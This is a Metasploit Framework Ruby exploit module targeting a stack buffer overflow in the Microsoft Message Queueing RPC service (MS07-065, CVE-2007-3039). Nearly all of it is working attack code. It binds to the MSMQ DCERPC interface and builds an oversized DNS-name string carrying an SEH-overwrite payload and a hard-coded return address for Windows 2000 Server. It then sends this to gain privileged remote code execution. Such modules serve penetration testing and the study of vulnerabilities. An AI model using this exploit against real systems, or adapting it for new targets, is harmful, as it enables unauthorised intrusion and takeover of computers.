##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Exploits::Windows::Dcerpc::MS07_065_MSMQ < Msf::Exploit::Remote

	include Exploit::Remote::DCERPC
	include Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft Message Queueing Service DNS Name Path Overflow',
			'Description'    => %q{
				This module exploits a stack overflow in the RPC interface
			to the Microsoft Message Queueing service. This exploit requires
			the target system to have been configured with a DNS name and
			for that name to be supplied in the 'DNAME' option. This name does
			not need to be served by a valid DNS server, only configured on 
			the target machine.
			
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2007-3039'],
					[ 'MSB', 'MS07-065'],
				],
			'Privileged'     => true,			
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e\xff",
					'StackAdjustment' => -3500,

				},
			'Targets'        => 
				[
					[
						'Windows 2000 Server English',
						{
							'Platform' => 'win',
							'Ret'      => 0x75022ac4 # ws2help - pop/pop/ret
						},
					],
				],
			'DisclosureDate' => 'Dec 11 2007',
			'DefaultTarget' => 0))
		
		# Change the default port values to point at MSMQ
		register_options(
			[
				Opt::RPORT(2103),
				OptString.new('DNAME',  [ true,  "The DNS hostname of the target" ]),
			], self.class)
	end

	def autofilter
		# Common vulnerability scanning tools report port 445/139
		# due to how they test for the vulnerability. Remap this
		# back to 2103 for automated exploitation
		
		rport = datastore['RPORT'].to_i
		if ( rport == 2103 or rport == 2103 )
			datastore['RPORT'] = 2103
		end
		
		# The NetBIOS hostname is required to exploit this bug
		if (not datastore['DNAME'])
			# XXX automatically determine the hostname
			return false
		end
		
		true
	end
	
	def exploit

		connect
		print_status("Trying target #{target.name}...")
		
		handle = dcerpc_handle('fdb3a030-065f-11d1-bb9b-00a024ea5525', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])
		print_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		print_status("Bound to #{handle} ...")

		dname = datastore['DNAME']
	
		boom = rand_text_alphanumeric(4096)
		
		hname,domain = dname.split(".")
		
		if(not domain)
			print_status("The DNAME parameter specified is not valid.")
			print_status("This option must be the fully-qualified domain name of the target (as it has been configured).")
			return
		end
		
		off = 306 - hname.length
		
		seh = generate_seh_payload(target.ret)
		boom[off, seh.length] = seh
		
		buff  = Rex::Text.to_unicode("#{dname}\\")
		buff << boom
		buff << "\x00\x00"
		
		# Data alignment
		while(buff.length % 4 != 0)
			buff << "\x00"
		end
		
		stubdata = 
			NDR.long(1) +                                           # [in] long arg_1,
			NDR.UnicodeConformantVaryingStringPreBuilt(buff) +      # [in][string] wchar_t * arg_2,
			NDR.long(0) * 5                                         # ... fields we can ignore

		print_status('Sending exploit...')

		begin	
			response = dcerpc.call(6, stubdata)

			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				case dcerpc.last_response.stub_data
				when "\x14\x00\x0e\xc0"
					print_status("Error: The wrong value has been supplied for the DNAME parameter")
					print_status("This value must be the fully-qualified domain name of the target")
					print_status("Many systems have no FQDN configured and cannot be exploited")
				else		
					print_status("An unknown response was received from the server:")
					print_status(">> " + dcerpc.last_response.stub_data.unpack("H*")[0])
				end
			end
		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
			print_status("No response from the DCERPC service (this is usually a good thing).")
		end
		
		handler
		disconnect
	end

end
end

